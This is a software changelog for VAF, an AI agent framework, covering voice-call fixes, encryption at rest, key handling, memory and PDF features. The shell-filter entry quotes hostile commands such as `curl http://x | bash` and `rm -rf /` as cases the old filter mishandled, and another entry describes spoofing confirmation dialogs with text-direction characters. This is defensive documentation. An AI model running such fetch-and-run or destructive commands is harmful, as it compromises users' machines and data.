- Installing VAF from a package gave you an agent with no vocabulary. The
  built wheel contained the Python code and almost nothing else: the
  vocabulary book (every spoken line and the yes/no lexicons), the coder's
  project scaffolds, the seeded tool-knowledge cards and the WhatsApp
  bridge were all missing, so an installed copy silently fell back to
  built-in English defaults. Measured on the built artifact, and a test
  now builds a wheel and checks.
- Voice call: a confirmation answer is now read in the language it was asked
  in. Since yes and no moved into the multilingual vocabulary, every
  language's words were matched at once - and "da" means yes in Romanian
  and Serbian, so a German sentence starting with "Da ..." answered the
  agent's "was that you?" with yes, relabelling a voice segment and feeding
  the speaker profile. Answers typed without umlauts ("natuerlich") now
  count too.
- Hosting: `voice_semantic_endpoint_enabled` is admin-only, as its
  documentation always claimed. It was writable by any account on the
  network, and arming it makes every call stream microphone audio to the
  server and download a model there, for the whole instance.
- Voice call: answering the agent's "did you mean me?" in your own words
  counts as an answer again. The confirmation only recognised a short
  hardcoded list (ja/jo/yes/yep), so a natural "Natuerlich, meinte ich
  dich", a French "Bien sur" or a Turkish "Tabii ki" was treated as side
  talk and silently ignored. Yes and no now come from the same vocabulary
  book the rest of the assistant speaks from (16 languages so far, more
  fill in on a later generator run), while the old pattern stays as the
  fallback for elongations like "jaaa" and as a safety net if the book
  cannot load.
- Linux hosting: starting VAF no longer asks for the root password on every
  start. The culprit was the firewall presence CHECK itself: reading the
  rule configuration is a polkit admin action on common distros, so checking
  whether the rule existed raised the very dialog it tried to avoid - for
  weeks, every password went into the check while the rule existed the whole
  time. A local marker now remembers what this install already set up (a
  normal start runs no firewall reads at all), a real change elevates exactly
  once with check and add together, and the setup runs at most once per
  start (TLS mode runs two internal servers and could raise two dialogs).
  Even asking "is firewalld running" turned out to be admin-gated on
  openSUSE, so that probe now asks systemd instead of firewall-cmd.
- Voice call: the assistant no longer denies a capability in the same
  breath as delegating the task ("I can't check your mails, but..."
  spoken while the mail check was already handed to the main agent).
  When a delegation survives, such a denial is replaced by the normal
  short acknowledgement.
- `vaf secure rotate-db` works now; its first live run found two defects. It
  crashed before touching anything (the config's plain `postgresql://` address
  selected a database driver that is not installed), and it rotated only the
  app role while the more powerful owner role kept the published default
  password, with the warning reading "all clear" because it only checked the
  app connection. The command now rotates both roles, each verified before
  anything is saved, and the warning watches both connections.

### Added
- **Developers can now build voice assistants on VAF.** The live-call turn
  pipeline - noise gate, speech-to-text, speaker verification with the
  anti-spoofing rules, the reflex policy, the reply layer and the delegation
  decision - is available as a library object: `from vaf import
  VoiceTurnEngine, TurnOutcome`. You bring the microphone, the transport and
  the text-to-speech (and your own recognizer via the `transcribe` seam); the
  engine returns one decided outcome per utterance. It is the exact object
  VAF's own web call runs on. Contract and runnable example: EMBEDDING.md
  ("Running a voice turn yourself") and examples/09_voice_turn.py.
- **The voice call got measurably faster, and it now measures itself.** Three
  independent cuts. Memory lookups behind every turn: the embedding model padded
  every text to its full width, so a short query cost ~140 ms - now ~7 ms, which
  also speeds up memory search and document lookups everywhere else. The
  listening detector: the pause before the agent accepts that you finished
  dropped by roughly half a second (a smoothing filter meant for visual meters
  was delaying the decision, background hum no longer counts as speech, and the
  silence window shrank accordingly). And every call turn now reports where its
  time went - microphone wait, transcription, speaker check, answer, speech -
  so the next slow turn is a log line, not a guess.
- **Optional: the agent can hear that you merely paused (off by default).** With
  `voice_semantic_endpoint_enabled` the browser streams the microphone to the
  server during a call and a small local model (Smart Turn v3, 8 MB, runs on
  CPU, BSD-2 licensed, downloaded on first use) judges from your intonation
  whether you actually finished the sentence - a mid-sentence thinking pause no
  longer ends your turn, and a finished one ends it without waiting out the full
  silence timer. The browser's own timer always remains as the fallback.
- **You can see, and cap, what the API costs per user.** VAF measured tokens
  for every call and then forgot them; nothing added them up and nothing could
  stop a runaway loop, even though one instance serves several people plus
  automations and background thinking from your keys. Each call is now
  estimated and written to a per-user daily ledger, and
  `spend_budget_usd_per_day` (admin-only, off by default) ends a turn once that
  user reaches their cap, naming the setting in the message. The figure is an
  estimate and says so: a model that is not in the price table is deliberately
  priced high, and the ledger counts how often it had to guess.
- **Hands-off mode for admins.** A new admin-only setting,
  `tool_confirmation_bypass_admins` (off by default), lets an admin run
  confirmation-gated tools without being asked each time. It skips only the
  question: who may call what is still decided by the admin-only rules and the
  per-account tool list, an application that explicitly demands a prompt still
  gets one, and every skipped dialog is recorded as an event, so hands-off does
  not mean unobserved.

### Fixed
- **Saying the agent's name is never answered with silence any more.** On a
  live call, a speaker the voice check did not recognize as the owner could
  address the agent by name - twice - and get nothing back: the small local
  model ignored its "you were addressed, answer" instruction and the safety
  net that overrides such silent drops only protected recognized owners. It
  now covers every turn that clearly addresses the agent; the reply is a short
  spoken "say that again" that grants nothing (all action rules still require
  the verified voice). The dropped speaker in the live incident was in fact
  the owner, mislabeled by a short noisy clip - exactly the case the net is
  for.
- **A finished answer no longer waits minutes for an invisible check.** After
  the reply is already on screen, a small internal check decides whether the
  agent just asked you a question. On API providers that check had no time
  limit of its own and could sit silently for minutes while the stop button
  stayed lit (observed live: 343 seconds, with no trace in any log). It is now
  hard-bounded at a few seconds, falls back to a simple text check when it
  cannot answer in time, and writes a log line either way.
- **A confirmation you granted no longer speaks for everyone on the machine.**
  Answering "always" wrote a single shared file, so on a LAN instance that
  permission was armed for every other user too - silently, because a standing
  permission skips the dialog before anything is logged. Permissions are stored
  per user now. The old shared file is set aside rather than inherited, so the
  next dangerous tool asks once more, for you alone.
- **Loop-protection notes no longer look like something you wrote.** When a
  turn hit its tool budget, the framework appended its stop notice to the
  conversation as a user message, so it was saved with the session, could
  become the session's title, counted towards compaction and reappeared as a
  chat bubble of yours after a reload. It is stored as a system note now; what
  the model is told is unchanged.
- **One local mode sent the conversation unrepaired.** Of the three ways VAF
  reaches a model, the in-process local one (Linux with Python 3.12 and no
  llama-server, e.g. a fresh Ubuntu install) skipped every pre-send repair: a
  half-finished tool call could stay in the history, images were never turned
  into text, the memory context silently vanished, and turns that were meant to
  run without tools still got them. It now goes through the same preparation as
  the other two.
- **The confirmation dialog can no longer show something other than what runs.**
  Arguments went to the dialog raw, so a text-direction control character could
  visually reverse a command, an access token was displayed in full, and a
  command cut at 300 characters looked exactly like a short one. Hidden
  characters are now shown as visible markers, secrets are replaced (the
  surrounding option is kept, so you still see what was passed), a cut says so,
  and shell commands carry a plain-language note of what they do. The terminal
  prompt and the TUI modal show the arguments at all now - until today they
  asked you to approve a tool name.
- **The shell safety filter no longer blocks ordinary work while letting the
  dangerous cases through.** It matched substrings, so `rm -rf /tmp/scratch`
  was refused (the text contains `rm -rf /`) while `curl http://x | bash`,
  `rm  -rf  /` with a double space, and a command that builds its executable
  from a substitution all ran. It now reads the command the way a shell does -
  quote-aware, following pipes and substitutions - and judges what would
  actually execute. The coder's jailed shell and the machine's confirmed shell
  get different verdicts, because one runs inside a network-less sandbox and
  the other does not, and every refusal now says which property triggered it.
- **Output no longer kills a program on Windows.** When output is redirected -
  into a file, a pipe, or a build log - Windows uses a narrow character set that
  cannot represent a checkmark, an emoji, or anything a model might reply with.
  Printing one ended the program. The command line already protected itself;
  the runnable examples and the maintenance scripts did not, so one of the
  examples died on the first encrypted file it tried to show. All of them now
  share one fix, and a test catches the next one in under a second instead of
  after half an hour on the Windows build.
- **A notification in the Logs window now shows where it came from.** The dot on
  the sidebar counts everything in the security log, but the window worked out
  its own number by adding up the firewall, channel and skill counters - so an
  event belonging to none of them, such as the warning that the memory database
  still uses the shipped default password, lit the dot outside and marked
  nothing inside. Both read the same number now, so a new kind of event can
  never again arrive unannounced.
- **A first start can no longer mint two different master keys.** Bringing up the
  tray and the background workers at once meant several processes resolving the
  encryption key simultaneously, and two that minted at the same moment both
  wrote it - the later one winning. Anything the earlier one had already
  encrypted was then unreadable for good, with no error anywhere. The key is
  created once now, under a machine-wide lock, and a process that loses the race
  adopts the winner's key instead of overwriting it.
- **Setting a password can no longer paper over a lost key store.** Writing the
  admin password's offline copy went straight into the key store without the
  check every other write performs, so on a machine whose store had gone missing
  it quietly created a fresh one - after which everything looked healthy while
  the keys that open the actual data were gone. It now refuses, and points at the
  recovery key.
- **Encryption at rest now behaves on Windows and macOS, not only on Linux.**
  The feature had been designed and tested on one platform, and two of its
  assumptions were POSIX assumptions. On Windows `chmod` cannot restrict who may
  read a file at all, so the master key now goes into the Credential Manager
  there - where your Windows login protects it - instead of into a file VAF
  cannot protect; Linux and macOS keep the owner-only file, because `chmod` is
  real there and both OS keyrings can lock the app out of its own data. Renaming
  a file into place is also not the same operation on Windows: it fails while
  another program has the file open, which for a virus scanner or a search
  indexer is routine, so every store write now retries briefly instead of losing
  a chat. The threat table in the documentation states what holds per platform
  rather than giving one answer for all three.
- **A recovery key can no longer be lost the moment it is created.** VAF wrote
  the key file first and the note that contains the key second, so if the note
  could not be written - a Desktop macOS has denied access to, a
  OneDrive-redirected Desktop, a full disk - the result was a recovery file that
  nothing on earth could open, while `vaf secure status` reported the recovery
  key as set up and never tried again. The note is written first now, and
  nothing is stored unless it succeeded.
- **The Redis password left the installation folder.** It was written to a
  `.env` beside the program files, which on Windows is frequently outside your
  user profile and therefore readable by every account on the machine, and which
  editors offer to load into every terminal they open. It now lives with the
  other keys in `~/.vaf/compose.env`, and an existing file loses only that line.
- **Redirecting output no longer walks past the terminal password.**
  `vaf session export <id> > chat.txt` skipped the prompt entirely, because the
  gate asked whether output was a terminal as well as input. Exporting your
  chats is exactly what that gate is for.
- **The terminal app encrypts existing chats like the other start paths.** The
  default `vaf run` lane never ran the at-rest migration, so a terminal-only
  user kept plaintext chats indefinitely while the tray and the other CLI lanes
  converted theirs.
- **`vaf start` no longer exits immediately on Windows**, where it waited for a
  signal in a way that only exists on Unix and took the background service down
  with it a second later.
- **The Context Window showed another lane's goal, plan and tasks.** The panel
  asked the backend for "the agent's brain" without naming a chat, and the
  server then answered from a shared store that scheduled automations and other
  session-less lanes write into - so an open conversation could display a
  morning-weather automation's instructions next to an unrelated timer's plan,
  while its own working memory sat unread. It now asks for the open chat and
  refetches when you switch chats. The same endpoint had no login check at all,
  which on a local-network install meant anyone who could reach the port could
  read the agent's working memory; it now requires a session you own.
- **A long turn no longer pushes the chat sideways.** The row of step dots under
  a turn drew one dot per step with no limit, so a turn with ninety steps ran
  wider than the window and put the whole conversation into horizontal scroll.
  It now shows the first ten and the last three with the gap marked, and the
  count beside it still names the total.

### Added
- **Your chats are encrypted on disk.** Everything VAF stores about a
  conversation - the chat records, the pre-compression archives, hand-off
  bundles, sub-agent task text and the agent's working memory - is now written
  as AES-256-GCM ciphertext instead of readable JSON. If the laptop is stolen or
  the SSD ends up somewhere else, the passwords, keys and doctor's or lawyer's
  matters in those chats are not readable. The key is held by the machine in an
  owner-only file, so the agent still starts and works on its own after a
  reboot; on installs that start VAF from inside the desktop session, setting
  `secure_store_kek_backend = "keyring"` before the first start creates it in
  the OS keyring instead, which your login password protects. Chats written
  before this keep opening, and are re-written encrypted the next time they are
  saved. `file_encryption_enabled` turns it off for anyone whose storage already
  does this. Full threat table, including what it deliberately does NOT cover:
  `docs/security/ENCRYPTION_AT_REST.md`.
- **A recovery key, so a reinstall is not the end of your chats.** The moment
  the keys are created, VAF writes `VAF-BackThisUp.md` to your Desktop: one
  256-bit recovery key plus plain instructions. With it and a copy of two small
  key files you can open your data on a completely new machine
  (`vaf secure recover`) - without it, a lost operating-system login means the
  encrypted chats are gone, and nobody can help. The note says in its first line
  that it is itself a key and belongs somewhere other than that Desktop.
- **All encryption keys left `config.json`.** The memory key, the mail key, the
  GitHub key, the token signing secret and the master key used to sit in
  plaintext in the same file tree as the data they protect, which made
  "encrypted at rest" mean very little. They now live in one encrypted keyring
  whose master key is an owner-only file of its own (or the OS keyring, if you
  opt in with `secure_store_kek_backend`), and API keys no longer keep a
  plaintext copy behind either. A one-time `config.json.pre-keyring.bak` is
  written before anything is removed, so a downgrade stays possible.
  `vaf secure status` shows where every key is.
- **The terminal asks for your password.** `vaf run`, the TUI and the whole
  `vaf session` group now require the admin password before starting - the web
  UI always did, the terminal never did, and `vaf session export` prints the
  very chats the encryption protects. Scripts, `vaf run -p`, the tray,
  automations and background workers are never prompted; they run inside the
  protected area already. Verified against a hash stored locally, so a stopped
  database cannot lock you out. `cli_password_gate` turns it off.
- **`vaf secure`** - `status` says where each key lives, what is still
  unprotected and which files have to be backed up together on THIS machine;
  `recover` puts the data key back after a reinstall using the recovery key; and
  `rotate-db` replaces the shipped default database password (verified before it
  is saved, so a half-finished rotation cannot lock you out).
- **A runnable example for the storage modes** -
  `examples/08_session_storage_and_encryption.py` walks the four decisions an
  embedder makes (plaintext, plaintext with several tenants, encrypted, and
  recovery after the machine key is deleted) against a throwaway home directory.
  It needs no model, no API key and no network, and greps the raw bytes to show
  what is and is not readable on disk.
- **Cross Chat Hint: the agent can point at your other chats.** Below the memory
  snippets it now gets up to two short pointers into your OTHER still-existing
  chats when they match your question by keyword, so "we worked on a PDF the
  other day" can find the chat where that happened. The long-term memory could
  never answer this: session summaries are stored without the chat they came
  from. Matching is lexical and reads the session files directly, so it also
  works while the memory database is down, and it is umlaut-tolerant and reaches
  into German compounds (`Reisekostenabrechnung` finds a chat about
  `Reisekosten`). A single hit on an everyday word produces nothing. Hints come
  only from chats you own, never from a deleted one, and never from a
  conversation with a contact; background runs, front-office turns and voice
  calls get none at all. Visible as its own section in the RAG snippets panel,
  with the number of hints per turn in Settings -> Persona & Memory, and
  inspectable with
  `vaf memory cross-chat --query "..."`. New keys: `cross_chat_hint_enabled`,
  `cross_chat_hint_k`, `cross_chat_hint_min_terms`, `cross_chat_hint_min_score`,
  `cross_chat_hint_max_age_days`.
- **`memory_search` now also searches your other chats.** Asking "when did we talk
  about X?" or "which chat was that in?" gets a second, clearly separated section
  listing the chats a topic appears in, with the chat's name and how long ago it
  was. The saved-facts half could never answer that - stored memories do not
  record which conversation they came from. Because this half reads the chat files
  rather than the database, the tool keeps answering when the memory service is
  down instead of only reporting the outage. The same switch as above turns it off.
- **Breaking-change contract tests embedders can run in their own CI.** The
  stable embedding surface documented in EMBEDDING.md ("What is and isn't
  stable") is now pinned by an offline, self-contained pytest suite under
  `tests/contract/` - one file per contract module (facade exports, `Agent`,
  `CoreAgent`, `BaseTool`/`user_jail`, `ToolCaller`/`ToolRequest`, the account
  allowlist resolver, `vaf.markers`, `extract_pdf_markdown`, the session/turn
  context API, and the `vaf.tools` entry-point group). Vendor the directory
  from the tag you build against and run it against any newer VAF release: a
  failure means that release breaks the promised surface. The suite isolates
  itself from your real home and config directories when run standalone; see
  `tests/contract/README.md`.

### Fixed
- **Encrypted stores close behind themselves.** Reading accepted files without
  the encryption header, so that older chats keep opening - correct during the
  changeover, and a hole if it stayed on: anyone able to write into the store
  could put a plain file there and it would be read as if it were yours. Once a
  startup pass finds nothing unencrypted left, VAF stops accepting plain files
  (`allow_plaintext_at_rest`). Also: the recovery note is now excluded from the
  agent's own file tools and indexer, which would otherwise have read the
  recovery key and stored it in the memory database, and it ships one encoding
  of that key instead of two - the word list carried fewer bits than the file
  claimed and had no checksum.
- **Log files stop collecting your conversations in the clear.** The full
  assembled system prompt - your profile, retrieved memories, working memory,
  contacts - was written to `prompt_*.log` on every build, with debug logging on
  by default. That is off now (`prompt_log_full_enabled`). Logs also default to
  the data directory beside your other VAF data instead of the source checkout,
  which on at least one machine meant an unencrypted disk; `VAF_DEV_LOGS=1`
  brings the old location back for development.
- **Old conversation snapshots no longer pile up forever.** The pre-compression
  archives were only cleaned when VAF shut down cleanly, so a crash or a killed
  tray left them for good - thousands of files, each a fuller copy of a chat
  than the chat itself. They are now swept by age
  (`context_archive_max_age_days`, default 14), and finished sub-agent task
  files are deleted instead of accumulating.
- **The master key no longer hides where the app cannot reach it.** It defaulted
  to the operating system's keyring, which is the stronger place - and is
  unreachable from the background process that actually runs VAF, because the
  tray is started without a desktop session. The first real restart spent 295
  failed attempts on it. The default is now an owner-only file beside the other
  VAF data, protected by whatever disk encryption sits underneath;
  `secure_store_kek_backend = "keyring"` opts back in for installs that start
  VAF from the desktop session, and an unreachable keyring now falls back to a
  file copy instead of locking the app out.
- **Data could be encrypted with a key that was never saved.** When the
  read-back after writing a new key did not show it, the code handed out the
  copy it still held in memory. Whatever was encrypted with it became
  unreadable the moment that process exited - and the next start found
  ciphertext it could not open, which correctly stopped the migration and left
  it stuck. A key that is not in the store is now an error, not a value to use.
- **A second process could make the key store unreadable while every write
  reported success.** Each process cached the key that opens the store for its
  own lifetime. When another one re-wrapped that store - which happens the
  first time each key is used - the first kept sealing its writes with the
  outdated key: the write went through, the lock was held, nothing looked
  wrong, and the result was a store nobody could open, including the process
  that had just written it. On a live machine that showed up as 34 successful
  key writes that left nothing behind, and a migration that then refused to run
  at all. The cache is now checked against the store's key file on every use.
- **A missing key store is treated as a loss, not as a fresh start.** VAF now
  records that an installation has a keyring, so if that store later disappears
  it refuses to create a new key and points at the recovery key. Without
  that, a lost store looked exactly like a first run - and because the old
  plaintext copies in `config.json` are cleared during the move, the new key
  quietly replaced the only one that could still open the encrypted memories.
  Observed twice in one real start before this landed.
- **A key that cannot be stored is an error, not a reason to make another one.**
  When the key store could not be written, every following call minted a fresh
  key and tried again. Nothing was lost this time because no write ever landed,
  but one that had would have made everything encrypted before it unreadable.
  The write now fails loudly, and the "minted a new key" line is written after
  the key is actually stored rather than before.
- **The rollback copy of `config.json` survives until the move is proven.** It
  was deleted as soon as `config.json` held no keys - which is briefly true even
  when the new store could not be written at all. It now waits until the key
  store opens and actually contains the keys.
- **Redis and Postgres.** The cache that holds decrypted memory ran with no
  password at all; it now gets one from the keyring. VAF also warns when the
  database still uses the password that ships with the project.
- **The memory block no longer piles up inside a single turn.** The retrieved
  memories were merged into the first system message in place, and for API
  providers that message is the stored history entry, so every tool round-trip
  of the same turn appended the whole block again: one archived conversation
  carried a 145,000-character system message with 24 copies of it. The block is
  now built into a copy of the message, which leaves the history clean and keeps
  the prompt the size it looks. The empty-response retry also forwards the
  memories instead of silently retrying without them.
- **Session search only searches your own chats.** `vaf session search` walked
  every session file on the machine with no owner check, so on a shared
  installation it could print other people's chat text. It now runs under the
  caller's identity, on the same strict-ownership walker the rest of the session
  reads use.
- **The interactive lanes stop writing attached files into the chat record.**
  Typing `@some/file` inlines that file for the turn, and the expanded text was
  what got saved as your message, so whole files (an `.env`, a contract) ended up
  inside the session JSON as if you had typed them. What you typed is what is
  stored now, exactly as the web lane already did it.
- **"Remember this" no longer gets flagged as something the agent made up.**
  Asking the agent to save a fact ran the save, stored it, and then tripped
  the anti-confabulation guard: the reply "Saved." was declared unearned and
  the agent was forced to correct an answer that was true. The cause was a
  classification error. `memory_save` writes to the memory store and counts as
  a real action everywhere else, but the grounding rule counted it as
  note-taking, and because saving is irreversible the plan gate forces a plan
  call into the same turn, leaving a turn that looks like nothing but
  note-taking. The rule now covers only the working-memory tools it was
  written for. A wrongly forced correction could also send the turn off course:
  in the reported case the agent, told its confirmation was fiction, offered to
  deliver the answer over a messaging channel that was never asked for.
- **Your memory encryption key can no longer be silently replaced.** The
  config file is written by several processes at once, and a reader that
  caught it mid-write saw an empty file, concluded "no key yet" and minted a
  fresh one - permanently locking every already-encrypted memory. Config
  writes are now atomic (a reader always sees a complete file), concurrent
  writers are serialized, a save that omits the key keeps the stored one, and
  the key loader re-reads the raw file and refuses to mint while the file
  cannot be parsed. Minting a first-run key is now logged loudly.
- **A rotated memory key is recoverable: `vaf memory rekey`.** If memories
  show "[Decryption failed]" because the key changed, the new command
  re-encrypts every affected row from a config backup that still carries the
  previous key (dry-run first; rows neither key opens are counted and never
  touched).
- **Learning the same PDF twice is refused, not duplicated.** The content
  checksum of every finished document is stored with it; clicking learn again
  on a byte-identical file (even re-uploaded under a new name) now answers
  "already learned" with the stored numbers, and the button shows the learned
  state. A deliberate re-learn stays available via force_relearn.
- **Table-of-contents pages are no longer learned as knowledge.** Learning a
  document skipped nothing before: the contents/list-of-tables pages became
  stored "knowledge" full of dot leaders and wasted one model call each. They
  are now detected and skipped in both the learning and the attachment
  indexing lane, and the completion message names how many were skipped.
- **Clicking a tag now lists its memories where you can use them.** The tag's
  memories appear in the Memory Search panel as a result list and stay there
  while you click through them, instead of vanishing the moment you opened the
  first one. A new search, another tag or the clear button replaces the list.
  Memory tag chips open the same list, which also makes tags usable on a phone,
  where the graph is hidden.
- **The memory graph shows ALL memories again.** It used to load only the 100
  most recently changed entries, so learning a large document pushed every
  older memory out of sight. The graph now renders the whole store of the
  current user on a WebGL canvas (force-directed layout, node size by
  connections, labels on zoom, click a legend entry to filter a type) and
  updates right after a document finishes learning. The Settings preview
  shows the same renderer (the old boxed copy could freeze on large stores),
  and labels adapt to dark mode.
- **The agent no longer "thinks without answering".** Some API models
  intermittently emit their tool call as plain text instead of through the
  tool channel; the turn then ended with a visible thought and nothing else,
  because nothing was executed and the raw text was hidden. This leaked shape
  is now recognized and executed like a normal tool call - keeping the
  provider's own call id, which the follow-up request requires.
- **Scanned PDFs no longer poison the memory.** A scanned document of four or
  more pages never triggered the OCR fallback, because the check mistook the
  extractor's own page markers for text - so learning such a document stored
  bare page scaffolding as knowledge. The check now counts real content, and
  when OCR cannot run, the answer names the actual reason (a missing Tesseract
  used to be reported as an empty document) instead of staying silent.
- **Reading a huge PDF no longer eats gigabytes.** The PDF reader kept every
  page in memory until the end - measured 9 GB for a 1000-page book. Pages are
  now released as they are read: same output, byte for byte, at 0.7 GB.

### Added
- **Scanned PDFs work out of the box - and Windows is no longer a special
  case.** Text recognition for scans now has two engines: Tesseract (free,
  local - the installers set it up on every platform, including Windows via
  winget, with the German language pack) and the vision model (reads each page
  with one model call, using your Vision setting - no system install at all).
  The default picks Tesseract when present, else the vision model, and an
  explicit choice in Settings never silently runs the other one. The
  GPL-licensed poppler dependency is gone entirely: page images come straight
  from the PDF or a permissively licensed renderer that ships as a normal
  Python package.
- **A learn button on every attached document.** Once a chat attachment
  finishes indexing, a button on its row starts learning it into long-term
  memory - no chat command needed. Attached documents are stored as real files
  now, which is also what makes "learn this attachment" work at all: the old
  advice pointed at a path that did not exist. A banner shows the batch
  progress with a cancel, and the button reflects the state (learning /
  learned).
- **Learning a large document finally learns the whole document.** Learning a
  PDF silently kept the first 200 pages and 40 sections - 4% of a 1000-page
  book - and reported success. Learning now runs as a background job in
  batches: the banner shows "batch N of M", the terminal app shows the same
  numbers, and the finish message reports exactly what was learned (pages of
  total, sections, pages without text). An interrupted or stopped run
  continues where it left off instead of starting over or storing duplicates,
  and a document that changed on disk since is refused with a clear message
  instead of being silently mixed with the old knowledge. Caps still exist,
  but only if you set them - and when one fires, the answer names it.
- **"Read pages 100-120" of a PDF now actually works.** The tip existed, the
  feature did not: every PDF read took the first 50 pages and silently cut the
  rest. Both read lanes accept a page range now, and every PDF answer says
  honestly which pages of how many it covers and how to continue - instead of
  a bare "(truncated)".
- **Large uploads no longer kill the connection silently.** On the desktop
  and LAN paths, attaching a file above roughly 12 MB dropped the WebSocket
  mid-upload with nothing but the reconnect banner - the 200 MB frame ceiling
  existed on one server entry point only. Every server the app starts now
  shares the same ceiling, and attachments above 100 MB per file are refused
  up front with a message naming the file and the limit.
- **A local model that can see images finally does.** Local vision only
  worked if you had explicitly set the vision provider to "local" - leaving
  it on its default meant the local server started without the image
  bridge, and the agent answered that images are not supported while the
  settings looked correct. The empty setting now means what it means
  everywhere else: use whatever the main agent uses, if it can see images. A
  chosen cloud provider still wins, and still handles the images itself.
- **Turning local vision on takes effect without restarting VAF.** The image
  bridge is chosen when the model server starts, and a server that was
  already running got reused as long as it held the right model - so the new
  setting changed nothing until something else happened to restart it. VAF
  now notices that the running server cannot see and restarts it.
- **Voice input stops blaming faster-whisper for everything.** The error
  "faster-whisper not installed" was shown for any import problem at all,
  including an installed faster-whisper whose native part refuses to load -
  a common case on macOS. The message now names the setting that led there
  and the actual reason, so the search starts in the right place.
- **Picking a cloud speech provider no longer leaves a local engine behind.**
  Choosing a provider on top of an earlier "Local" pick kept the engine on
  "Local", so the day the key stopped working the microphone dropped into an
  engine that is not part of the standard installation, while the settings
  showed a cloud provider. A cloud provider now also switches the engine back,
  and one place decides where recorded audio goes - the two microphones (web
  and terminal) used to decide it differently.
- **The local speech engine can be installed at all now.** Settings offered
  "Local" speech recognition for an engine that no installer delivered.
  It is part of the speech extra from now on: `pip install "vaf[speech]"`,
  and the option says so.
- **A created file is shown on the answer it came with.** An image you attached,
  or a file the agent wrote, appeared as a chip under the PREVIOUS answer -
  every time from the second message on, not just occasionally. The file was
  announced while its own answer was still being written, and the chat had to
  guess which message it belonged to. Every answer and every file now says which
  exchange it belongs to, so the chip waits for its own answer instead of
  landing on the one before it. The same file is also no longer shown twice, a
  file produced during a longer agent turn no longer disappears from view, and a
  coding agent that finishes minutes later still finds the right message.

### Fixed
- **The Overview headline no longer runs into the module list.** On a Mac at the
  usual laptop widths, "Keine Auffaelligkeiten" was drawn straight across the
  status dots beside it. The text column claimed it could shrink to 200 pixels
  while 160 of those were reserved for the shield next to it, so the headline was
  handed 40 pixels and simply painted past them. It now says what it actually
  needs, so the panel stacks the way it already did on narrower screens, and a
  long word breaks rather than overflowing. Nothing moves on wide screens.

- **The shield gets out of the way in a narrow window.** It is anchored to the
  middle of the protection panel, which is right while the headline and the
  status rows sit side by side. Once the panel stacks, that middle IS the status
  list, so the big shield sat behind the rows. Stacked, it now sits level with
  the headline, to its left, and shrinks to match it, glow and all. Wide windows
  are unchanged.
- **Repair waits while the containers are still starting.** Right after VAF
  starts, the services are on their way up and do not answer yet, which read as
  a fault and invited a repair that would only have restarted what was already
  booting. The button now counts down and says the containers are starting, the
  overview says the same, and a repair leaves a booting container alone. The
  wait is each container's own start window, so it is thirty seconds for the
  database and two minutes for the speech services rather than one guess for
  everything.

### Added
- **Health and updates, in the Logs overview.** A new row under Guardrails shows
  whether your services are connected and lights up amber when an update is
  waiting; clicking it opens the same Update and Repair dialog as Settings. It
  reads the update answer from disk, so opening Logs never asks GitHub anything.
- **See what one user did.** Next to the date in the Logs window, an admin can
  now pick a user and read that person's timeline and tool calls alone. It
  appears once a machine has more than one account. Two deliberate honesty
  points: a name that matches nobody shows nothing rather than everything, and
  entries that carry no user - background work, and anything logged before this
  release stamped identities - are counted and named under the filter instead of
  quietly disappearing into someone's empty day.
- **Update and Repair, at the bottom of Settings -> Advanced.** One dialog for
  the two things that used to need a terminal. On the right, your containers as
  a map: green means the service answers, not merely that it runs, so a
  container that is up while VAF cannot reach it stops looking healthy. Amber
  covers the case that used to be the hardest to see, a container publishing a
  different port than the configuration expects. Everything that is not green is
  listed with a Repair button that starts what is stopped, restarts what does
  not answer, and says in plain words what it cannot fix by itself. On the left,
  the installed version and when updates were last checked, a button to check
  now, and, when there is something newer, the new version with an Update now
  button. The update runs by itself: VAF stops, updates, and starts again, and
  the page waits for it and reloads when it is back. It refuses instead of
  half-updating when it cannot finish the job, and says why.
- **`vaf repair` in the terminal, `/repair` in the terminal app.** The same
  check and repair run, with `vaf repair --check` reporting the status without
  changing anything. Nothing is ever removed and no configuration is rewritten:
  a port that disagrees with the configuration is reported with both numbers,
  never silently corrected.

### Changed
- **The Debug Logs switch is gone from Settings.** Debug logging is on by
  default and stays on; turning it off is a deliberate opt-out via
  `debug_logs_enabled` in `config.json`, not a toggle to trip over. The Logs
  page's empty states name that config key now, so a config with it off does
  not dead-end pointing at a switch that no longer exists.

## [0.1.0a21] - 2026-08-08

### Added
- **The README says plainly what VAF sends and where it goes.** A new
  "What VAF sends, and where" section: VAF collects no usage data and reports
  nothing to Veyllo, there is no analytics SDK and no crash reporter, and the
  only outbound request VAF makes on its own is the startup version check
  against GitHub's public releases API - which carries no data about you and
  which `update_check_on_start: false` turns off. The section is equally plain
  about the other direction: if you point VAF at a cloud provider, your prompts
  go to that provider. "No telemetry" means Veyllo receives nothing; it does not
  mean a cloud-backed agent works without talking to the cloud. The README badge
  row now also shows the release, last commit, tool and test counts, the number
  of supported LLM providers, and the supported platforms.
- **The license now states, in one place, what a fork owes its users.** VAF
  carries a short legal notice under Section 7(b) of the AGPL, in English and
  German, naming its origin and the obligations that come with it: pass it on
  under the same license, make the corresponding source available, and if you run
  a modified version as a network service, offer that service's users your
  complete source. It also names the commercial license as the way out of those
  obligations. A fork must keep the notice in its source. It does **not** have to
  be displayed anywhere, and it restricts nothing else - renaming, rebranding and
  commercial operation stay permitted, exactly as the AGPL allows. The notice is
  static text: nothing about it is transmitted, and it involves no telemetry of
  any kind.

- **Tools can write their own log lines: `self.log(...)`.** Every tool - including
  one written by a third party against the public `BaseTool` - can now report what
  it is doing without reaching into VAF's internals. Lines land in `tools_*.log`
  with the tool name and session filled in, follow the same `VAF_LOG_DIR` and
  `Debug Logs` settings as everything else, and are cleaned up by the same garbage
  collector. It never raises, so a logging mistake cannot fail a tool call.
- **Sessions can be created, renamed and deleted inside the terminal app.**
  The sessions panel (Ctrl+S) gained `n` for a fresh session, `r` to rename
  the highlighted one and `d` to delete it after a confirmation - deleting
  the session you are in is refused until you switch away. `/session new`
  and `/session rename <name>` do the same from the prompt. The panel now
  shows the same list the web sidebar shows: messenger chats and internal
  thinking runs stay in their dashboards instead of flooding the list.
- **A session keeps ONE name everywhere, including across a web rename.**
  Renaming is now a single engine operation that changes the session file
  and nothing else - before, renaming from a list could silently drag the
  renamed session's saved state into the running one. The terminal app
  adopts the on-disk name before saving on exit, so renaming a chat in the
  web while the terminal had it open no longer loses the new name when the
  terminal closes; the background worker had silently ignored web renames
  altogether and now honors them.
- **Switching sessions in the terminal app now shows the conversation.**
  Loading another session swapped the agent's memory but left the previous
  conversation on screen, and a resumed session started with an empty
  transcript as if nothing had ever been said. The transcript now follows: a
  switch repaints the loaded conversation (the newest forty messages, with an
